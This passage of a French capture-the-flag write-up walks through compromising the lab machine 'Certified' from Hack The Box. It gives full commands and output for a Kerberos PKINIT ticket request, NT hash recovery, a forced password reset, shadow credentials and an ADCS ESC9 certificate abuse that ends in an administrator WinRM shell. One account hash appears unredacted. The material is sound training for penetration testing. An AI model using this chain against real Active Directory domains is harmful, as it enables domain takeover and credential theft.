+</span></span><span class="line"><span class="cl"><span class="n">No</span> <span class="n">outfile</span> <span class="n">path</span> <span class="n">was</span> <span class="n">provided</span><span class="o">.</span> <span class="n">The</span> <span class="n">certificate</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">will</span> <span class="n">be</span> <span class="n">stored</span> <span class="n">with</span> <span class="n">the</span> <span class="n">filename</span><span class="p">:</span> <span class="n">bmxwKuqv</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">PEM</span> <span class="n">certificate</span> <span class="n">at</span> <span class="n">path</span><span class="p">:</span> <span class="n">bmxwKuqv_cert</span><span class="o">.</span><span class="n">pem</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">PEM</span> <span class="n">private</span> <span class="n">key</span> <span class="n">at</span> <span class="n">path</span><span class="p">:</span> <span class="n">bmxwKuqv_priv</span><span class="o">.</span><span class="n">pem</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="n">TGT</span> <span class="n">can</span> <span class="n">now</span> <span class="n">be</span> <span class="n">obtained</span> <span class="n">with</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">dirkjanm</span><span class="o">/</span><span class="n">PKINITtools</span>
+</span></span><span class="line"><span class="cl"><span class="n">Run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">command</span> <span class="n">to</span> <span class="n">obtain</span> <span class="n">a</span> <span class="n">TGT</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">PKINITtools</span><span class="o">/</span><span class="n">gettgtpkinit</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">cert</span><span class="o">-</span><span class="n">pem</span> <span class="n">bmxwKuqv_cert</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">key</span><span class="o">-</span><span class="n">pem</span> <span class="n">bmxwKuqv_priv</span><span class="o">.</span><span class="n">pem</span> <span class="n">certified</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">management_svc</span> <span class="n">bmxwKuqv</span><span class="o">.</span><span class="n">ccache</span></span></span></code></pre></div></div>
+<p>Utilisation de <code>PKINITOOLS</code> pour obtenir un TGT Kerberos (ticket-granting-ticket) pour le compte management_svc.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─➤  gettgtpkinit.py -cert-pem bmxwKuqv_cert.pem -key-pem bmxwKuqv_priv.pem certified.htb/management_svc management.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2025-06-21 06:39:07,127 minikerberos INFO     Loading certificate and key from file
+</span></span><span class="line"><span class="cl">INFO:minikerberos:Loading certificate and key from file
+</span></span><span class="line"><span class="cl">2025-06-21 06:39:07,143 minikerberos INFO     Requesting TGT
+</span></span><span class="line"><span class="cl">INFO:minikerberos:Requesting TGT
+</span></span><span class="line"><span class="cl">2025-06-21 06:39:19,718 minikerberos INFO     AS-REP encryption key (you might need this later):
+</span></span><span class="line"><span class="cl">INFO:minikerberos:AS-REP encryption key (you might need this later):
+</span></span><span class="line"><span class="cl">2025-06-21 06:39:19,718 minikerberos INFO     fed0e233abea622ddcd76397eaf56bf3b7948f256e2fbc6c92be350b48ae18a2
+</span></span><span class="line"><span class="cl">INFO:minikerberos:fed0e233abea622ddcd76397eaf56bf3b7948f256e2fbc6c92be350b48ae18a2
+</span></span><span class="line"><span class="cl">2025-06-21 06:39:19,723 minikerberos INFO     Saved TGT to file
+</span></span><span class="line"><span class="cl">INFO:minikerberos:Saved TGT to file</span></span></code></pre></div></div>
+<p>Définir la variable d&rsquo;environnement <code>KRB5CCNAME</code> pour qu&rsquo;elle pointe vers le fichier <code>management.ccache</code> précédemment généré.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">management</span><span class="o">.</span><span class="n">ccache</span></span></span></code></pre></div></div>
+<p>J&rsquo;utilise <code>getnthash.py</code> pour récupérer le hash NTLM du compte management_svc.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─➤  getnthash.py -key fed0e233abea622ddcd76397eaf56bf3b7948f256e2fbc6c92be350b48ae18a2 certified.htb/management_svc
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Using TGT from cache
+</span></span><span class="line"><span class="cl">[*] Requesting ticket to self with PAC
+</span></span><span class="line"><span class="cl">Recovered NT Hash
+</span></span><span class="line"><span class="cl">&lt;hash de management_svc&gt;</span></span></code></pre></div></div>
+<h2 id="shell-en-tant-quadministrator">Shell en tant qu&rsquo;administrator</h2>
+<h3 id="genericall-sur-ca_operator">GenericAll sur ca_operator</h3>
+<p>Comme vu sur <code>BloodHound</code>, <code>management_svc</code> a le droit <code>GenericAll</code> sur l&rsquo;utilisateur <code>ca_operator</code>. Cela lui permet donc de changer le mot de passe de ce dernier.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─➤  bloodyAD --host 10.129.2.225 -u &#39;management_svc&#39; -p &#39;:&lt;hash de management_svc&gt;&#39; -d certified.htb set password &#39;ca_operator&#39; &#39;Password@2025&#39;
+</span></span><span class="line"><span class="cl">[+] Password changed successfully!</span></span></code></pre></div></div>
+<h3 id="esc9">ESC9</h3>
+<p>Après énumération des templates et des certificats, je vois que le template <code>CertifiedAuthentication</code> est vulnérable à une ESC9.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certipy find -u &#39;ca_operator&#39; -p &#39;Password@2025&#39; -d &#39;certified.htb&#39; -vulnerable -stdout</span></span></code></pre></div></div>
+<p>Je synchronise le temps entre ma machine et la cible.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># faketime &#34;$(rdate -n dc01.certified.htb -p | awk &#39;{print $2, $3, $4}&#39; | date -f - &#34;+%Y-%m-%d %H:%M:%S&#34;)&#34; zsh</span></span></code></pre></div></div>
+<p>J&rsquo;obtiens le hash NT de <code>ca_operator</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># certipy shadow auto -username &#34;management_svc@certified.htb&#34; -hashes &#34;:&lt;hash de management_svc&gt;&#34; -account &#39;ca_operator&#39;
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Targeting user &#39;ca_operator&#39;
+</span></span><span class="line"><span class="cl">[*] Generating certificate
+</span></span><span class="line"><span class="cl">[*] Certificate generated
+</span></span><span class="line"><span class="cl">[*] Generating Key Credential
+</span></span><span class="line"><span class="cl">[*] Key Credential generated with DeviceID &#39;830846d5-5f20-aef4-d672-f15818faf3c4&#39;
+</span></span><span class="line"><span class="cl">[*] Adding Key Credential with device ID &#39;830846d5-5f20-aef4-d672-f15818faf3c4&#39; to the Key Credentials for &#39;ca_operator&#39;
+</span></span><span class="line"><span class="cl">[*] Successfully added Key Credential with device ID &#39;830846d5-5f20-aef4-d672-f15818faf3c4&#39; to the Key Credentials for &#39;ca_operator&#39;
+</span></span><span class="line"><span class="cl">[*] Authenticating as &#39;ca_operator&#39; with the certificate
+</span></span><span class="line"><span class="cl">[*] Using principal: ca_operator@certified.htb
+</span></span><span class="line"><span class="cl">[*] Trying to get TGT...
+</span></span><span class="line"><span class="cl">[*] Got TGT
+</span></span><span class="line"><span class="cl">[*] Saved credential cache to &#39;ca_operator.ccache&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to retrieve NT hash for &#39;ca_operator&#39;
+</span></span><span class="line"><span class="cl">[*] Restoring the old Key Credentials for &#39;ca_operator&#39;
+</span></span><span class="line"><span class="cl">[*] Successfully restored the old Key Credentials for &#39;ca_operator&#39;
+</span></span><span class="line"><span class="cl">[*] NT hash for &#39;ca_operator&#39;: &lt;hash de ca_operator&gt;</span></span></code></pre></div></div>
+<p>Ensuite, le <code>userPrincipalName</code> de <code>ca_operator</code> est modifié en <code>administrator</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># certipy account update -username &#34;management_svc@certified.htb&#34; -hashes &#34;:a091c1832bcdd4677c28b5a6a1295584&#34; -user &#39;ca_operator&#39; -upn &#39;administrator&#39;
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Updating user &#39;ca_operator&#39;:
+</span></span><span class="line"><span class="cl">    userPrincipalName                   : administrator
+</span></span><span class="line"><span class="cl">[*] Successfully updated &#39;ca_operator&#39;</span></span></code></pre></div></div>
+<p>Le certificat vulnérable peut être demandé en tant que <code>ca_operator</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># certipy req -username &#34;ca_operator@certified.htb&#34; -hashes &#34;&lt;hash de ca_operator&gt;&#34; -target &#34;dc01.certified.htb&#34; -ca &#39;certified-DC01-CA&#39; -template &#39;CertifiedAuthentication&#39; -debug
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[+] Trying to resolve &#39;dc01.certified.htb&#39; at &#39;8.8.8.8&#39;
+</span></span><span class="line"><span class="cl">[+] Trying to resolve &#39;CERTIFIED.HTB&#39; at &#39;8.8.8.8&#39;
+</span></span><span class="line"><span class="cl">[+] Generating RSA key
+</span></span><span class="line"><span class="cl">[*] Requesting certificate via RPC
+</span></span><span class="line"><span class="cl">[+] Trying to connect to endpoint: ncacn_np:10.129.2.225[\pipe\cert]
+</span></span><span class="line"><span class="cl">[+] Connected to endpoint: ncacn_np:10.129.2.225[\pipe\cert]
+</span></span><span class="line"><span class="cl">[*] Successfully requested certificate
+</span></span><span class="line"><span class="cl">[*] Request ID is 8
+</span></span><span class="line"><span class="cl">[*] Got certificate with UPN &#39;administrator&#39;
+</span></span><span class="line"><span class="cl">[*] Certificate has no object SID
+</span></span><span class="line"><span class="cl">[*] Saved certificate and private key to &#39;administrator.pfx&#39;</span></span></code></pre></div></div>
+<p>L&rsquo;UPN de <code>ca_operator</code> est reconverti en quelque chose d&rsquo;autre.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># certipy account update -username &#34;management_svc@certified.htb&#34; -hashes &#34;:a091c1832bcdd4677c28b5a6a1295584&#34; -user &#39;ca_operator&#39; -upn &#34;ca_operator@certified.htb&#34;
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Updating user &#39;ca_operator&#39;:
+</span></span><span class="line"><span class="cl">    userPrincipalName                   : ca_operator@certified.htb
+</span></span><span class="line"><span class="cl">[*] Successfully updated &#39;ca_operator&#39;</span></span></code></pre></div></div>
+<p>Désormais, l&rsquo;authentification avec le certificat obtenu fournira le hash NT de l&rsquo;utilisateur <code>administrator</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># certipy auth -pfx &#39;administrator.pfx&#39; -domain &#34;certified.htb&#34;
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Using principal: administrator@certified.htb
+</span></span><span class="line"><span class="cl">[*] Trying to get TGT...
+</span></span><span class="line"><span class="cl">[*] Got TGT
+</span></span><span class="line"><span class="cl">[*] Saved credential cache to &#39;administrator.ccache&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to retrieve NT hash for &#39;administrator&#39;
+</span></span><span class="line"><span class="cl">[*] Got hash for &#39;administrator@certified.htb&#39;: 
+</span></span><span class="line"><span class="cl">aad3b435b51404eeaad3b435b51404ee:&lt;hash de administrator&gt;</span></span></code></pre></div></div>
+<h3 id="winrm">WinRM</h3>
+<p>Maintenant je peux avoir un shell en tant que <code>administrator</code> et chercher les deux flags.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># evil-winrm -u &#34;administrator&#34; -H &#34;&lt;hash de administrator&gt;&#34; -i &#34;10.129.2.225&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type &#34;C:/Users/Administrator/Desktop/root.txt&#34;
+</span></span><span class="line"><span class="cl">4&lt;ROOT FLAG REDACTED&gt;6
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cd &#34;C:/users/management_svc/Desktop&#34;
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\users\management_svc\Desktop&gt; type user.txt
+</span></span><span class="line"><span class="cl">1&lt;USER FLAG REDACTED&gt;5
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\users\management_svc\Desktop&gt;</span></span></code></pre></div></div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/certified/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/certified/" data-title="Certified" data-via="z3rodol" data-hashtags="Medium,Windows,Active Directory,ESC9,ADCS"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/medium/">Medium</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/esc9/">ESC9</a>,&nbsp;<a href="/tags/adcs/">ADCS</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/baby/" class="prev" rel="prev" title="Baby"><i class="fas fa-angle-left" aria-hidden="true"></i>Baby</a>
+            <a href="/down/" class="next" rel="next" title="Down">Down<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
